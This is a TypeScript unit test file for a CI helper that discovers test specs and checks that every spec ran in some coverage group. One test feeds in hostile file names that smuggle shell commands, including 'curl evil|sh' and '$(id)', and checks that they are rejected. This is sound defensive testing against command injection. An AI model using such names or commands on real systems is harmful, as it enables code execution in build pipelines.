/**
 * Unit tests for spec discovery and the coverage completeness guard.
 *
 * Both exist for the same failure: a spec that is on disk but in no group in
 * `l1-contracts-ci.yaml` would never run, and every job would still be green.
 *
 * Run with: yarn test:plan-groups
 */

import * as assert from "assert/strict";
import * as fs from "fs";
import * as os from "os";
import * as path from "path";
import { assertEverySpecRan, discoverSpecs } from "../../plan-coverage-groups";
import { createSuite } from "./harness";

const { test, run } = createSuite("plan-coverage-groups");

const realSpecs = discoverSpecs(path.join(__dirname, "../hardhat"));

test("discovers the specs that exist on disk", () => {
  assert.ok(realSpecs.length >= 2, `expected at least 2 specs, found ${realSpecs.length}`);
  for (const spec of realSpecs) {
    assert.match(spec, /^\d+-.*\.spec\.ts$/);
    assert.ok(fs.existsSync(path.join(__dirname, "../hardhat", spec)));
  }
});

// Spec names are listed space-separated in the workflow matrix and expanded by a shell, so a name
// carrying shell syntax would be command injection reachable by adding a file to the repo. Rejecting
// rather than filtering: a silently skipped spec is a test dropped from coverage while every job
// still reports success.
test("rejects spec file names that a shell would not treat as one word", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "spec-names-"));
  const hostile = ["01-a;curl evil|sh.spec.ts", "02-$(id).spec.ts", "03-two words.spec.ts", "04-`id`.spec.ts"];
  for (const name of hostile) {
    const scoped = fs.mkdtempSync(path.join(dir, "case-"));
    fs.writeFileSync(path.join(scoped, "05-legitimate.spec.ts"), "");
    fs.writeFileSync(path.join(scoped, name), "");
    assert.throws(() => discoverSpecs(scoped), /unsafe for shell expansion/, name);
  }

  // ...while the names this repo actually uses stay acceptable.
  const ok = fs.mkdtempSync(path.join(dir, "ok-"));
  for (const name of ["01-deployment-verification.spec.ts", "13-imt-atomic-swap.spec.ts", "07-a.b_c.spec.ts"]) {
    fs.writeFileSync(path.join(ok, name), "");
  }
  assert.equal(discoverSpecs(ok).length, 3);
});

// The guard that lets the matrix be hardcoded: `coverage-report` compares what the groups reported
// *running* against what is on disk, so a spec left out of the matrix fails the run by name.
test("assertEverySpecRan catches a spec that no group ran", () => {
  const onDisk = ["01-a.spec.ts", "02-b.spec.ts", "03-c.spec.ts"];

  assert.doesNotThrow(() => assertEverySpecRan(onDisk, ["03-c.spec.ts", "01-a.spec.ts", "02-b.spec.ts"]));

  assert.throws(() => assertEverySpecRan(onDisk, ["01-a.spec.ts", "02-b.spec.ts"]), /no coverage group ran them/);
  assert.throws(() => assertEverySpecRan(onDisk, ["01-a.spec.ts", "02-b.spec.ts"]), /03-c\.spec\.ts/);

  // Nothing ran at all — e.g. every group failed before writing its record.
  assert.throws(() => assertEverySpecRan(onDisk, []), /no coverage group ran them/);
});

// The other direction: a matrix still naming a spec that was renamed or deleted.
test("assertEverySpecRan catches a group running a spec that no longer exists", () => {
  assert.throws(
    () => assertEverySpecRan(["01-a.spec.ts"], ["01-a.spec.ts", "99-renamed.spec.ts"]),
    /do not exist on disk/
  );
});

// Duplicates are expected, not an error: groups shard in-process and a worker writes its own record,
// so the union sees the same name more than once.
test("assertEverySpecRan tolerates a spec reported by more than one record", () => {
  assert.doesNotThrow(() => assertEverySpecRan(["01-a.spec.ts"], ["01-a.spec.ts", "01-a.spec.ts"]));
});

run();
